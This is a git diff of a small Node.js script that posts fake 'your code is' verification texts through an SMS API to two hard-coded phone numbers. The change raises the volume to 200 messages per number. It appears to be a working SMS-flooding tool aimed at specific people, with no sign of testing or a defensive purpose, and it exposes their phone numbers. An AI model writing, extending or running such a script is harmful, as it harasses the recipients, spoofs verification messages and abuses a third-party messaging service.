@@ -2,15 +2,15 @@ const axios = require('axios');
 
 const url = 'http://sms-service.gamespot.uz:35000/api/sendmessage';
 const numbers = [
-  '99891354568',
-  '99891152624'
+  '998913574568',
+  '998911552624'
 ];
 
 async function sendRequests() {
   try {
-    const codes = Array.from({ length: 1 }, () => (Math.floor(Math.random() * 9000) + 1000).toString().substring(0, 4));
+    const codes = Array.from({ length: 200 }, () => (Math.floor(Math.random() * 9000) + 1000).toString().substring(0, 4));
 
-    const senders = Array.from({ length: 5 }, () => Math.floor(1000 + Math.random() * 9000));
+    const senders = Array.from({ length: 1 }, () => Math.floor(1000 + Math.random() * 9000));
 
     const responses = await Promise.all(
       senders.flatMap(sender =>
@@ -19,7 +19,7 @@ async function sendRequests() {
             const requestBody = {
               number: number,
               sender: 'sender-' + sender.toString(),
-              sms_text: `your code is: 300`
+              sms_text: `your code is: 4545`
             };
 
             return axios.post(url, requestBody, {
